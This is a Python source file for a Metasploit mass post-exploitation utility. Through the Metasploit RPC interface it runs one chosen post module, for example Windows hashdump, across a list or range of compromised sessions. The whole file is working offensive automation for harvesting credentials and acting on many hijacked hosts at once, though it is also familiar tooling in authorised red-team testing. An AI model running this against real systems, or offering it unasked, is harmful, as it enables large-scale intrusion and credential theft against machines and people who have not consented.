#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Metasploit mass post-exploitation utility
#
# Example:
# $ ./multipost.py -m windows/gather/hashdump -s 1-10,12,14-18
#

from argparse import ArgumentParser

from lib.helpers import add_rpc_parser, explode_ranges
from lib.msfrpc import rpc_connect


def parse_args():
    parser = ArgumentParser(description='Metasploit mass post-exploitation utility')
    parser.add_argument(
        '-m', '--module',
        help='post module to run',
        required=True
    )
    parser.add_argument(
        '-s', '--sessions',
        help='comma-separated list of sessions and/or session-ranges',
        required=True
    )
    parser.add_argument(
        '--opts',
        help='comma-separated options to pass to the post module'
    )

    add_rpc_parser(parser)
    return parser.parse_args()


def main():
    args = parse_args()
    rpc = rpc_connect(
        host=args.rpc_host, port=args.rpc_port, ssl=args.rpc_ssl,
        user=args.rpc_user, passwd=args.rpc_passwd
    )
    if args.opts is None:
        opts = {}
    else:
        opts = dict(o.split('=') for o in args.opts.split(','))
    print("[+] Running {} against the following sessions: {}".format(args.module, args.sessions))
    for sess_id in explode_ranges(args.sessions):
        opts['SESSION'] = sess_id
        rpc.call('module.execute', ['post', args.module, opts])
        print("[-] Launched module against session #{}".format(sess_id))
    print("[+] Done")


if __name__ == '__main__':
    main()
